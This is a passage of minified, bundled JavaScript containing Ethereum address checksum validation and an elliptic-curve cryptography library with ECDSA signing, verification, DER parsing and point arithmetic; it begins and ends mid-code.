            e.match(/^(0x)?[0-9a-fA-F]{40}$/)) {
                e.startsWith("0x") || (e = "0x" + e);
                const t = _x(e);
                return NS(!e.match(/([A-F].*[a-f])|([a-f].*[A-F])/) || t === e, "bad address checksum", "address", e),
                t
            }
            if (e.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)) {
                NS(e.substring(2, 4) === kx(e), "bad icap checksum", "address", e);
                let t = function(e) {
                    e = e.toLowerCase();
                    let t = xx;
                    for (let r = 0; r < e.length; r++)
                        t = t * Ox + Mx[e[r]];
                    return t
                }(e.substring(4)).toString(16);
                for (; t.length < 40; )
                    t = "0" + t;
                return _x("0x" + t)
            }
            NS(!1, "invalid address", "address", e)
        }
        BigInt(0);
        const Fx = BigInt(1)
          , Ux = BigInt(2)
          , Dx = e => e instanceof Uint8Array
          , Lx = Array.from({
            length: 256
        }, ( (e, t) => t.toString(16).padStart(2, "0")));
        function jx(e) {
            if (!Dx(e))
                throw new Error("Uint8Array expected");
            let t = "";
            for (let r = 0; r < e.length; r++)
                t += Lx[e[r]];
            return t
        }
        function zx(e) {
            if ("string" !== typeof e)
                throw new Error("hex string expected, got " + typeof e);
            return BigInt("" === e ? "0" : "0x".concat(e))
        }
        function Vx(e) {
            if ("string" !== typeof e)
                throw new Error("hex string expected, got " + typeof e);
            const t = e.length;
            if (t % 2)
                throw new Error("padded hex string expected, got unpadded hex of length " + t);
            const r = new Uint8Array(t / 2);
            for (let n = 0; n < r.length; n++) {
                const t = 2 * n
                  , o = e.slice(t, t + 2)
                  , i = Number.parseInt(o, 16);
                if (Number.isNaN(i) || i < 0)
                    throw new Error("Invalid byte sequence");
                r[n] = i
            }
            return r
        }
        function Hx(e) {
            return zx(jx(e))
        }
        function qx(e) {
            if (!Dx(e))
                throw new Error("Uint8Array expected");
            return zx(jx(Uint8Array.from(e).reverse()))
        }
        function Gx(e, t) {
            return Vx(e.toString(16).padStart(2 * t, "0"))
        }
        function $x(e, t) {
            return Gx(e, t).reverse()
        }
        function Kx(e, t, r) {
            let n;
            if ("string" === typeof t)
                try {
                    n = Vx(t)
                } catch (_l) {
                    throw new Error("".concat(e, ' must be valid hex string, got "').concat(t, '". Cause: ').concat(_l))
                }
            else {
                if (!Dx(t))
                    throw new Error("".concat(e, " must be hex string or Uint8Array"));
                n = Uint8Array.from(t)
            }
            const o = n.length;
            if ("number" === typeof r && o !== r)
                throw new Error("".concat(e, " expected ").concat(r, " bytes, got ").concat(o));
            return n
        }
        function Zx() {
            for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                t[r] = arguments[r];
            const n = new Uint8Array(t.reduce(( (e, t) => e + t.length), 0));
            let o = 0;
            return t.forEach((e => {
                if (!Dx(e))
                    throw new Error("Uint8Array expected");
                n.set(e, o),
                o += e.length
            }
            )),
            n
        }
        const Yx = e => (Ux << BigInt(e - 1)) - Fx
          , Jx = e => new Uint8Array(e)
          , Xx = e => Uint8Array.from(e);
        function Qx(e, t, r) {
            if ("number" !== typeof e || e < 2)
                throw new Error("hashLen must be a number");
            if ("number" !== typeof t || t < 2)
                throw new Error("qByteLen must be a number");
            if ("function" !== typeof r)
                throw new Error("hmacFn must be a function");
            let n = Jx(e)
              , o = Jx(e)
              , i = 0;
            const s = () => {
                n.fill(1),
                o.fill(0),
                i = 0
            }
              , a = function() {
                for (var e = arguments.length, t = new Array(e), i = 0; i < e; i++)
                    t[i] = arguments[i];
                return r(o, n, ...t)
            }
              , c = function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Jx();
                o = a(Xx([0]), e),
                n = a(),
                0 !== e.length && (o = a(Xx([1]), e),
                n = a())
            }
              , l = () => {
                if (i++ >= 1e3)
                    throw new Error("drbg: tried 1000 values");
                let e = 0;
                const r = [];
                for (; e < t; ) {
                    n = a();
                    const t = n.slice();
                    r.push(t),
                    e += n.length
                }
                return Zx(...r)
            }
            ;
            return (e, t) => {
                let r;
                for (s(),
                c(e); !(r = t(l())); )
                    c();
                return s(),
                r
            }
        }
        const eO = {
            bigint: e => "bigint" === typeof e,
            function: e => "function" === typeof e,
            boolean: e => "boolean" === typeof e,
            string: e => "string" === typeof e,
            stringOrUint8Array: e => "string" === typeof e || e instanceof Uint8Array,
            isSafeInteger: e => Number.isSafeInteger(e),
            array: e => Array.isArray(e),
            field: (e, t) => t.Fp.isValid(e),
            hash: e => "function" === typeof e && Number.isSafeInteger(e.outputLen)
        };
        function tO(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            const n = (t, r, n) => {
                const o = eO[r];
                if ("function" !== typeof o)
                    throw new Error('Invalid validator "'.concat(r, '", expected function'));
                const i = e[t];
                if ((!n || void 0 !== i) && !o(i, e))
                    throw new Error("Invalid param ".concat(String(t), "=").concat(i, " (").concat(typeof i, "), expected ").concat(r))
            }
            ;
            for (const [o,i] of Object.entries(t))
                n(o, i, !1);
            for (const [o,i] of Object.entries(r))
                n(o, i, !0);
            return e
        }
        const rO = BigInt(0)
          , nO = BigInt(1)
          , oO = BigInt(2)
          , iO = BigInt(3)
          , sO = BigInt(4)
          , aO = BigInt(5)
          , cO = BigInt(8);
        BigInt(9),
        BigInt(16);
        function lO(e, t) {
            const r = e % t;
            return r >= rO ? r : t + r
        }
        function uO(e, t, r) {
            if (r <= rO || t < rO)
                throw new Error("Expected power/modulo > 0");
            if (r === nO)
                return rO;
            let n = nO;
            for (; t > rO; )
                t & nO && (n = n * e % r),
                e = e * e % r,
                t >>= nO;
            return n
        }
        function dO(e, t, r) {
            let n = e;
            for (; t-- > rO; )
                n *= n,
                n %= r;
            return n
        }
        function hO(e, t) {
            if (e === rO || t <= rO)
                throw new Error("invert: expected positive integers, got n=".concat(e, " mod=").concat(t));
            let r = lO(e, t)
              , n = t
              , o = rO
              , i = nO
              , s = nO
              , a = rO;
            for (; r !== rO; ) {
                const e = n / r
                  , t = n % r
                  , c = o - s * e
                  , l = i - a * e;
                n = r,
                r = t,
                o = s,
                i = a,
                s = c,
                a = l
            }
            if (n !== nO)
                throw new Error("invert: does not exist");
            return lO(o, t)
        }
        function fO(e) {
            if (e % sO === iO) {
                const t = (e + nO) / sO;
                return function(e, r) {
                    const n = e.pow(r, t);
                    if (!e.eql(e.sqr(n), r))
                        throw new Error("Cannot find square root");
                    return n
                }
            }
            if (e % cO === aO) {
                const t = (e - aO) / cO;
                return function(e, r) {
                    const n = e.mul(r, oO)
                      , o = e.pow(n, t)
                      , i = e.mul(r, o)
                      , s = e.mul(e.mul(i, oO), o)
                      , a = e.mul(i, e.sub(s, e.ONE));
                    if (!e.eql(e.sqr(a), r))
                        throw new Error("Cannot find square root");
                    return a
                }
            }
            return function(e) {
                const t = (e - nO) / oO;
                let r, n, o;
                for (r = e - nO,
                n = 0; r % oO === rO; r /= oO,
                n++)
                    ;
                for (o = oO; o < e && uO(o, t, e) !== e - nO; o++)
                    ;
                if (1 === n) {
                    const t = (e + nO) / sO;
                    return function(e, r) {
                        const n = e.pow(r, t);
                        if (!e.eql(e.sqr(n), r))
                            throw new Error("Cannot find square root");
                        return n
                    }
                }
                const i = (r + nO) / oO;
                return function(e, s) {
                    if (e.pow(s, t) === e.neg(e.ONE))
                        throw new Error("Cannot find square root");
                    let a = n
                      , c = e.pow(e.mul(e.ONE, o), r)
                      , l = e.pow(s, i)
                      , u = e.pow(s, r);
                    for (; !e.eql(u, e.ONE); ) {
                        if (e.eql(u, e.ZERO))
                            return e.ZERO;
                        let t = 1;
                        for (let n = e.sqr(u); t < a && !e.eql(n, e.ONE); t++)
                            n = e.sqr(n);
                        const r = e.pow(c, nO << BigInt(a - t - 1));
                        c = e.sqr(r),
                        l = e.mul(l, r),
                        u = e.mul(u, c),
                        a = t
                    }
                    return l
                }
            }(e)
        }
        const pO = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
        function gO(e, t) {
            const r = void 0 !== t ? t : e.toString(2).length;
            return {
                nBitLength: r,
                nByteLength: Math.ceil(r / 8)
            }
        }
        function yO(e) {
            if ("bigint" !== typeof e)
                throw new Error("field order must be bigint");
            const t = e.toString(2).length;
            return Math.ceil(t / 8)
        }
        function mO(e) {
            const t = yO(e);
            return t + Math.ceil(t / 2)
        }
        const bO = BigInt(0)
          , vO = BigInt(1);
        function wO(e) {
            return tO(e.Fp, pO.reduce(( (e, t) => (e[t] = "function",
            e)), {
                ORDER: "bigint",
                MASK: "bigint",
                BYTES: "isSafeInteger",
                BITS: "isSafeInteger"
            })),
            tO(e, {
                n: "bigint",
                h: "bigint",
                Gx: "field",
                Gy: "field"
            }, {
                nBitLength: "isSafeInteger",
                nByteLength: "isSafeInteger"
            }),
            Object.freeze((0,
            k.A)((0,
            k.A)((0,
            k.A)({}, gO(e.n, e.nBitLength)), e), {
                p: e.Fp.ORDER
            }))
        }
        const {Ph: TO, aT: AO} = b
          , EO = {
            Err: class extends Error {
                constructor() {
                    super(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "")
                }
            }
            ,
            _parseInt(e) {
                const {Err: t} = EO;
                if (e.length < 2 || 2 !== e[0])
                    throw new t("Invalid signature integer tag");
                const r = e[1]
                  , n = e.subarray(2, r + 2);
                if (!r || n.length !== r)
                    throw new t("Invalid signature integer: wrong length");
                if (128 & n[0])
                    throw new t("Invalid signature integer: negative");
                if (0 === n[0] && !(128 & n[1]))
                    throw new t("Invalid signature integer: unnecessary leading zero");
                return {
                    d: TO(n),
                    l: e.subarray(r + 2)
                }
            },
            toSig(e) {
                const {Err: t} = EO
                  , r = "string" === typeof e ? AO(e) : e;
                if (!(r instanceof Uint8Array))
                    throw new Error("ui8a expected");
                let n = r.length;
                if (n < 2 || 48 != r[0])
                    throw new t("Invalid signature tag");
                if (r[1] !== n - 2)
                    throw new t("Invalid signature: incorrect length");
                const {d: o, l: i} = EO._parseInt(r.subarray(2))
                  , {d: s, l: a} = EO._parseInt(i);
                if (a.length)
                    throw new t("Invalid signature: left bytes after parsing");
                return {
                    r: o,
                    s: s
                }
            },
            hexFromSig(e) {
                const t = e => 8 & Number.parseInt(e[0], 16) ? "00" + e : e
                  , r = e => {
                    const t = e.toString(16);
                    return 1 & t.length ? "0".concat(t) : t
                }
                  , n = t(r(e.s))
                  , o = t(r(e.r))
                  , i = n.length / 2
                  , s = o.length / 2
                  , a = r(i)
                  , c = r(s);
                return "30".concat(r(s + i + 4), "02").concat(c).concat(o, "02").concat(a).concat(n)
            }
        }
          , PO = BigInt(0)
          , CO = BigInt(1)
          , SO = (BigInt(2),
        BigInt(3));
        BigInt(4);
        function IO(e) {
            const t = function(e) {
                const t = wO(e);
                tO(t, {
                    a: "field",
                    b: "field"
                }, {
                    allowedPrivateKeyLengths: "array",
                    wrapPrivateKey: "boolean",
                    isTorsionFree: "function",
                    clearCofactor: "function",
                    allowInfinityPoint: "boolean",
                    fromBytes: "function",
                    toBytes: "function"
                });
                const {endo: r, Fp: n, a: o} = t;
                if (r) {
                    if (!n.eql(o, n.ZERO))
                        throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
                    if ("object" !== typeof r || "bigint" !== typeof r.beta || "function" !== typeof r.splitScalar)
                        throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
                }
                return Object.freeze((0,
                k.A)({}, t))
            }(e)
              , {Fp: r} = t
              , n = t.toBytes || ( (e, t, n) => {
                const o = t.toAffine();
                return Zx(Uint8Array.from([4]), r.toBytes(o.x), r.toBytes(o.y))
            }
            )
              , o = t.fromBytes || (e => {
                const t = e.subarray(1);
                return {
                    x: r.fromBytes(t.subarray(0, r.BYTES)),
                    y: r.fromBytes(t.subarray(r.BYTES, 2 * r.BYTES))
                }
            }
            );
            function i(e) {
                const {a: n, b: o} = t
                  , i = r.sqr(e)
                  , s = r.mul(i, e);
                return r.add(r.add(s, r.mul(e, n)), o)
            }
            if (!r.eql(r.sqr(t.Gy), i(t.Gx)))
                throw new Error("bad generator point: equation left != right");
            function s(e) {
                return "bigint" === typeof e && PO < e && e < t.n
            }
            function a(e) {
                if (!s(e))
                    throw new Error("Expected valid bigint: 0 < bigint < curve.n")
            }
            function c(e) {
                const {allowedPrivateKeyLengths: r, nByteLength: n, wrapPrivateKey: o, n: i} = t;
                if (r && "bigint" !== typeof e) {
                    if (e instanceof Uint8Array && (e = jx(e)),
                    "string" !== typeof e || !r.includes(e.length))
                        throw new Error("Invalid key");
                    e = e.padStart(2 * n, "0")
                }
                let s;
                try {
                    s = "bigint" === typeof e ? e : Hx(Kx("private key", e, n))
                } catch (c) {
                    throw new Error("private key must be ".concat(n, " bytes, hex or bigint, not ").concat(typeof e))
                }
                return o && (s = lO(s, i)),
                a(s),
                s
            }
            const l = new Map;
            function u(e) {
                if (!(e instanceof d))
                    throw new Error("ProjectivePoint expected")
            }
            class d {
                constructor(e, t, n) {
                    if (this.px = e,
                    this.py = t,
                    this.pz = n,
                    null == e || !r.isValid(e))
                        throw new Error("x required");
                    if (null == t || !r.isValid(t))
                        throw new Error("y required");
                    if (null == n || !r.isValid(n))
                        throw new Error("z required")
                }
                static fromAffine(e) {
                    const {x: t, y: n} = e || {};
                    if (!e || !r.isValid(t) || !r.isValid(n))
                        throw new Error("invalid affine point");
                    if (e instanceof d)
                        throw new Error("projective point not allowed");
                    const o = e => r.eql(e, r.ZERO);
                    return o(t) && o(n) ? d.ZERO : new d(t,n,r.ONE)
                }
                get x() {
                    return this.toAffine().x
                }
                get y() {
                    return this.toAffine().y
                }
                static normalizeZ(e) {
                    const t = r.invertBatch(e.map((e => e.pz)));
                    return e.map(( (e, r) => e.toAffine(t[r]))).map(d.fromAffine)
                }
                static fromHex(e) {
                    const t = d.fromAffine(o(Kx("pointHex", e)));
                    return t.assertValidity(),
                    t
                }
                static fromPrivateKey(e) {
                    return d.BASE.multiply(c(e))
                }
                _setWindowSize(e) {
                    this._WINDOW_SIZE = e,
                    l.delete(this)
                }
                assertValidity() {
                    if (this.is0()) {
                        if (t.allowInfinityPoint && !r.is0(this.py))
                            return;
                        throw new Error("bad point: ZERO")
                    }
                    const {x: e, y: n} = this.toAffine();
                    if (!r.isValid(e) || !r.isValid(n))
                        throw new Error("bad point: x or y not FE");
                    const o = r.sqr(n)
                      , s = i(e);
                    if (!r.eql(o, s))
                        throw new Error("bad point: equation left != right");
                    if (!this.isTorsionFree())
                        throw new Error("bad point: not in prime-order subgroup")
                }
                hasEvenY() {
                    const {y: e} = this.toAffine();
                    if (r.isOdd)
                        return !r.isOdd(e);
                    throw new Error("Field doesn't support isOdd")
                }
                equals(e) {
                    u(e);
                    const {px: t, py: n, pz: o} = this
                      , {px: i, py: s, pz: a} = e
                      , c = r.eql(r.mul(t, a), r.mul(i, o))
                      , l = r.eql(r.mul(n, a), r.mul(s, o));
                    return c && l
                }
                negate() {
                    return new d(this.px,r.neg(this.py),this.pz)
                }
                double() {
                    const {a: e, b: n} = t
                      , o = r.mul(n, SO)
                      , {px: i, py: s, pz: a} = this;
                    let c = r.ZERO
                      , l = r.ZERO
                      , u = r.ZERO
                      , h = r.mul(i, i)
                      , f = r.mul(s, s)
                      , p = r.mul(a, a)
                      , g = r.mul(i, s);
                    return g = r.add(g, g),
                    u = r.mul(i, a),
                    u = r.add(u, u),
                    c = r.mul(e, u),
                    l = r.mul(o, p),
                    l = r.add(c, l),
                    c = r.sub(f, l),
                    l = r.add(f, l),
                    l = r.mul(c, l),
                    c = r.mul(g, c),
                    u = r.mul(o, u),
                    p = r.mul(e, p),
                    g = r.sub(h, p),
                    g = r.mul(e, g),
                    g = r.add(g, u),
                    u = r.add(h, h),
                    h = r.add(u, h),
                    h = r.add(h, p),
                    h = r.mul(h, g),
                    l = r.add(l, h),
                    p = r.mul(s, a),
                    p = r.add(p, p),
                    h = r.mul(p, g),
                    c = r.sub(c, h),
                    u = r.mul(p, f),
                    u = r.add(u, u),
                    u = r.add(u, u),
                    new d(c,l,u)
                }
                add(e) {
                    u(e);
                    const {px: n, py: o, pz: i} = this
                      , {px: s, py: a, pz: c} = e;
                    let l = r.ZERO
                      , h = r.ZERO
                      , f = r.ZERO;
                    const p = t.a
                      , g = r.mul(t.b, SO);
                    let y = r.mul(n, s)
                      , m = r.mul(o, a)
                      , b = r.mul(i, c)
                      , v = r.add(n, o)
                      , w = r.add(s, a);
                    v = r.mul(v, w),
                    w = r.add(y, m),
                    v = r.sub(v, w),
                    w = r.add(n, i);
                    let T = r.add(s, c);
                    return w = r.mul(w, T),
                    T = r.add(y, b),
                    w = r.sub(w, T),
                    T = r.add(o, i),
                    l = r.add(a, c),
                    T = r.mul(T, l),
                    l = r.add(m, b),
                    T = r.sub(T, l),
                    f = r.mul(p, w),
                    l = r.mul(g, b),
                    f = r.add(l, f),
                    l = r.sub(m, f),
                    f = r.add(m, f),
                    h = r.mul(l, f),
                    m = r.add(y, y),
                    m = r.add(m, y),
                    b = r.mul(p, b),
                    w = r.mul(g, w),
                    m = r.add(m, b),
                    b = r.sub(y, b),
                    b = r.mul(p, b),
                    w = r.add(w, b),
                    y = r.mul(m, w),
                    h = r.add(h, y),
                    y = r.mul(T, w),
                    l = r.mul(v, l),
                    l = r.sub(l, y),
                    y = r.mul(v, m),
                    f = r.mul(T, f),
                    f = r.add(f, y),
                    new d(l,h,f)
                }
                subtract(e) {
                    return this.add(e.negate())
                }
                is0() {
                    return this.equals(d.ZERO)
                }
                wNAF(e) {
                    return f.wNAFCached(this, l, e, (e => {
                        const t = r.invertBatch(e.map((e => e.pz)));
                        return e.map(( (e, r) => e.toAffine(t[r]))).map(d.fromAffine)
                    }
                    ))
                }
                multiplyUnsafe(e) {
                    const n = d.ZERO;
                    if (e === PO)
                        return n;
                    if (a(e),
                    e === CO)
                        return this;
                    const {endo: o} = t;
                    if (!o)
                        return f.unsafeLadder(this, e);
                    let {k1neg: i, k1: s, k2neg: c, k2: l} = o.splitScalar(e)
                      , u = n
                      , h = n
                      , p = this;
                    for (; s > PO || l > PO; )
                        s & CO && (u = u.add(p)),
                        l & CO && (h = h.add(p)),
                        p = p.double(),
                        s >>= CO,
                        l >>= CO;
                    return i && (u = u.negate()),
                    c && (h = h.negate()),
                    h = new d(r.mul(h.px, o.beta),h.py,h.pz),
                    u.add(h)
                }
                multiply(e) {
                    a(e);
                    let n, o, i = e;
                    const {endo: s} = t;
                    if (s) {
                        const {k1neg: e, k1: t, k2neg: a, k2: c} = s.splitScalar(i);
                        let {p: l, f: u} = this.wNAF(t)
                          , {p: h, f: p} = this.wNAF(c);
                        l = f.constTimeNegate(e, l),
                        h = f.constTimeNegate(a, h),
                        h = new d(r.mul(h.px, s.beta),h.py,h.pz),
                        n = l.add(h),
                        o = u.add(p)
                    } else {
                        const {p: e, f: t} = this.wNAF(i);
                        n = e,
                        o = t
                    }
                    return d.normalizeZ([n, o])[0]
                }
                multiplyAndAddUnsafe(e, t, r) {
                    const n = d.BASE
                      , o = (e, t) => t !== PO && t !== CO && e.equals(n) ? e.multiply(t) : e.multiplyUnsafe(t)
                      , i = o(this, t).add(o(e, r));
                    return i.is0() ? void 0 : i
                }
                toAffine(e) {
                    const {px: t, py: n, pz: o} = this
                      , i = this.is0();
                    null == e && (e = i ? r.ONE : r.inv(o));
                    const s = r.mul(t, e)
                      , a = r.mul(n, e)
                      , c = r.mul(o, e);
                    if (i)
                        return {
                            x: r.ZERO,
                            y: r.ZERO
                        };
                    if (!r.eql(c, r.ONE))
                        throw new Error("invZ was invalid");
                    return {
                        x: s,
                        y: a
                    }
                }
                isTorsionFree() {
                    const {h: e, isTorsionFree: r} = t;
                    if (e === CO)
                        return !0;
                    if (r)
                        return r(d, this);
                    throw new Error("isTorsionFree() has not been declared for the elliptic curve")
                }
                clearCofactor() {
                    const {h: e, clearCofactor: r} = t;
                    return e === CO ? this : r ? r(d, this) : this.multiplyUnsafe(t.h)
                }
                toRawBytes() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return this.assertValidity(),
                    n(d, this, e)
                }
                toHex() {
                    let e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0];
                    return jx(this.toRawBytes(e))
                }
            }
            d.BASE = new d(t.Gx,t.Gy,r.ONE),
            d.ZERO = new d(r.ZERO,r.ONE,r.ZERO);
            const h = t.nBitLength
              , f = function(e, t) {
                const r = (e, t) => {
                    const r = t.negate();
                    return e ? r : t
                }
                  , n = e => ({
                    windows: Math.ceil(t / e) + 1,
                    windowSize: 2 ** (e - 1)
                });
                return {
                    constTimeNegate: r,
                    unsafeLadder(t, r) {
                        let n = e.ZERO
                          , o = t;
                        for (; r > bO; )
                            r & vO && (n = n.add(o)),
                            o = o.double(),
                            r >>= vO;
                        return n
                    },
                    precomputeWindow(e, t) {
                        const {windows: r, windowSize: o} = n(t)
                          , i = [];
                        let s = e
                          , a = s;
                        for (let n = 0; n < r; n++) {
                            a = s,
                            i.push(a);
                            for (let e = 1; e < o; e++)
                                a = a.add(s),
                                i.push(a);
                            s = a.double()
                        }
                        return i
                    },
                    wNAF(t, o, i) {
                        const {windows: s, windowSize: a} = n(t);
                        let c = e.ZERO
                          , l = e.BASE;
                        const u = BigInt(2 ** t - 1)
                          , d = 2 ** t
                          , h = BigInt(t);
                        for (let e = 0; e < s; e++) {
                            const t = e * a;
                            let n = Number(i & u);
                            i >>= h,
                            n > a && (n -= d,
                            i += vO);
                            const s = t
                              , f = t + Math.abs(n) - 1
                              , p = e % 2 !== 0
                              , g = n < 0;
                            0 === n ? l = l.add(r(p, o[s])) : c = c.add(r(g, o[f]))
                        }
                        return {
                            p: c,
                            f: l
                        }
                    },
                    wNAFCached(e, t, r, n) {
                        const o = e._WINDOW_SIZE || 1;
                        let i = t.get(e);
                        return i || (i = this.precomputeWindow(e, o),
                        1 !== o && t.set(e, n(i))),
                        this.wNAF(o, i, r)
                    }
                }
            }(d, t.endo ? Math.ceil(h / 2) : h);
            return {
                CURVE: t,
                ProjectivePoint: d,
                normPrivateKeyToScalar: c,
                weierstrassEquation: i,
                isWithinCurveOrder: s
            }
        }
        function BO(e) {
            const t = function(e) {
                const t = wO(e);
                return tO(t, {
                    hash: "hash",
                    hmac: "function",
                    randomBytes: "function"
                }, {
                    bits2int: "function",
                    bits2int_modN: "function",
                    lowS: "boolean"
                }),
                Object.freeze((0,
                k.A)({
                    lowS: !0
                }, t))
            }(e)
              , {Fp: r, n: n} = t
              , o = r.BYTES + 1
              , i = 2 * r.BYTES + 1;
            function s(e) {
                return lO(e, n)
            }
            function a(e) {
                return hO(e, n)
            }
            const {ProjectivePoint: c, normPrivateKeyToScalar: l, weierstrassEquation: u, isWithinCurveOrder: d} = IO((0,
            k.A)((0,
            k.A)({}, t), {}, {
                toBytes(e, t, n) {
                    const o = t.toAffine()
                      , i = r.toBytes(o.x)
                      , s = Zx;
                    return n ? s(Uint8Array.from([t.hasEvenY() ? 2 : 3]), i) : s(Uint8Array.from([4]), i, r.toBytes(o.y))
                },
                fromBytes(e) {
                    const t = e.length
                      , n = e[0]
                      , s = e.subarray(1);
                    if (t !== o || 2 !== n && 3 !== n) {
                        if (t === i && 4 === n) {
                            return {
                                x: r.fromBytes(s.subarray(0, r.BYTES)),
                                y: r.fromBytes(s.subarray(r.BYTES, 2 * r.BYTES))
                            }
                        }
                        throw new Error("Point of length ".concat(t, " was invalid. Expected ").concat(o, " compressed bytes or ").concat(i, " uncompressed bytes"))
                    }
                    {
                        const e = Hx(s);
                        if (!(PO < (a = e) && a < r.ORDER))
                            throw new Error("Point is not on curve");
                        const t = u(e);
                        let o = r.sqrt(t);
                        return 1 === (1 & n) !== ((o & CO) === CO) && (o = r.neg(o)),
                        {
                            x: e,
                            y: o
                        }
                    }
                    var a
                }
            }))
              , h = e => jx(Gx(e, t.nByteLength));
            function f(e) {
                return e > n >> CO
            }
            const p = (e, t, r) => Hx(e.slice(t, r));
            class g {
                constructor(e, t, r) {
                    this.r = e,
                    this.s = t,
                    this.recovery = r,
                    this.assertValidity()
                }
                static fromCompact(e) {
                    const r = t.nByteLength;
                    return e = Kx("compactSignature", e, 2 * r),
                    new g(p(e, 0, r),p(e, r, 2 * r))
                }
                static fromDER(e) {
                    const {r: t, s: r} = EO.toSig(Kx("DER", e));
                    return new g(t,r)
                }
                assertValidity() {
                    if (!d(this.r))
                        throw new Error("r must be 0 < r < CURVE.n");
                    if (!d(this.s))
                        throw new Error("s must be 0 < s < CURVE.n")
                }
                addRecoveryBit(e) {
                    return new g(this.r,this.s,e)
                }
                recoverPublicKey(e) {
                    const {r: n, s: o, recovery: i} = this
                      , l = v(Kx("msgHash", e));
                    if (null == i || ![0, 1, 2, 3].includes(i))
                        throw new Error("recovery id invalid");
                    const u = 2 === i || 3 === i ? n + t.n : n;
                    if (u >= r.ORDER)
                        throw new Error("recovery id 2 or 3 invalid");
                    const d = 0 === (1 & i) ? "02" : "03"
                      , f = c.fromHex(d + h(u))
                      , p = a(u)
                      , g = s(-l * p)
                      , y = s(o * p)
                      , m = c.BASE.multiplyAndAddUnsafe(f, g, y);
                    if (!m)
                        throw new Error("point at infinify");
                    return m.assertValidity(),
                    m
                }
                hasHighS() {
                    return f(this.s)
                }
                normalizeS() {
                    return this.hasHighS() ? new g(this.r,s(-this.s),this.recovery) : this
                }
                toDERRawBytes() {
                    return Vx(this.toDERHex())
                }
                toDERHex() {
                    return EO.hexFromSig({
                        r: this.r,
                        s: this.s
                    })
                }
                toCompactRawBytes() {
                    return Vx(this.toCompactHex())
                }
                toCompactHex() {
                    return h(this.r) + h(this.s)
                }
            }
            const y = {
                isValidPrivateKey(e) {
                    try {
                        return l(e),
                        !0
                    } catch (t) {
                        return !1
                    }
                },
                normPrivateKeyToScalar: l,
                randomPrivateKey: () => {
                    const e = mO(t.n);
                    return function(e, t) {
                        let r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                        const n = e.length
                          , o = yO(t)
                          , i = mO(t);
                        if (n < 16 || n < i || n > 1024)
                            throw new Error("expected ".concat(i, "-1024 bytes of input, got ").concat(n));
                        const s = lO(r ? Hx(e) : qx(e), t - nO) + nO;
                        return r ? $x(s, o) : Gx(s, o)
                    }(t.randomBytes(e), t.n)
                }
                ,
                precompute() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 8
                      , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : c.BASE;
                    return t._setWindowSize(e),
                    t.multiply(BigInt(3)),
                    t
                }
            };
            function m(e) {
                const t = e instanceof Uint8Array
                  , r = "string" === typeof e
                  , n = (t || r) && e.length;
                return t ? n === o || n === i : r ? n === 2 * o || n === 2 * i : e instanceof c
            }
            const b = t.bits2int || function(e) {
                const r = Hx(e)
                  , n = 8 * e.length - t.nBitLength;
                return n > 0 ? r >> BigInt(n) : r
            }
              , v = t.bits2int_modN || function(e) {
                return s(b(e))
            }
              , w = Yx(t.nBitLength);
            function T(e) {
                if ("bigint" !== typeof e)
                    throw new Error("bigint expected");
                if (!(PO <= e && e < w))
                    throw new Error("bigint expected < 2^".concat(t.nBitLength));
                return Gx(e, t.nByteLength)
            }
            function A(e, n) {
                let o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : E;
                if (["recovered", "canonical"].some((e => e in o)))
                    throw new Error("sign() legacy options not supported");
                const {hash: i, randomBytes: u} = t;
                let {lowS: h, prehash: p, extraEntropy: y} = o;
                null == h && (h = !0),
                e = Kx("msgHash", e),
                p && (e = Kx("prehashed msgHash", i(e)));
                const m = v(e)
                  , w = l(n)
                  , A = [T(w), T(m)];
                if (null != y) {
                    const e = !0 === y ? u(r.BYTES) : y;
                    A.push(Kx("extraEntropy", e))
                }
                const P = Zx(...A)
                  , C = m;
                return {
                    seed: P,
                    k2sig: function(e) {
                        const t = b(e);
                        if (!d(t))
                            return;
                        const r = a(t)
                          , n = c.BASE.multiply(t).toAffine()
                          , o = s(n.x);
                        if (o === PO)
                            return;
                        const i = s(r * s(C + o * w));
                        if (i === PO)
                            return;
                        let l = (n.x === o ? 0 : 2) | Number(n.y & CO)
                          , u = i;
                        return h && f(i) && (u = function(e) {
                            return f(e) ? s(-e) : e
                        }(i),
                        l ^= 1),
                        new g(o,u,l)
                    }
                }
            }
            const E = {
                lowS: t.lowS,
                prehash: !1
            }
              , P = {
                lowS: t.lowS,
                prehash: !1
            };
            return c.BASE._setWindowSize(8),
            {
                CURVE: t,
                getPublicKey: function(e) {
                    let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    return c.fromPrivateKey(e).toRawBytes(t)
                },
                getSharedSecret: function(e, t) {
                    let r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                    if (m(e))
                        throw new Error("first arg must be private key");
                    if (!m(t))
                        throw new Error("second arg must be public key");
                    return c.fromHex(t).multiply(l(e)).toRawBytes(r)
                },
                sign: function(e, r) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : E;
                    const {seed: o, k2sig: i} = A(e, r, n)
                      , s = t;
                    return Qx(s.hash.outputLen, s.nByteLength, s.hmac)(o, i)
                },
                verify: function(e, r, n) {
                    var o;
                    let i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : P;
                    const l = e;
                    if (r = Kx("msgHash", r),
                    n = Kx("publicKey", n),
                    "strict"in i)
                        throw new Error("options.strict was renamed to lowS");
                    const {lowS: u, prehash: d} = i;
                    let h, f;
                    try {
                        if ("string" === typeof l || l instanceof Uint8Array)
                            try {
                                h = g.fromDER(l)
                            } catch (E) {
                                if (!(E instanceof EO.Err))
                                    throw E;
                                h = g.fromCompact(l)
                            }
                        else {
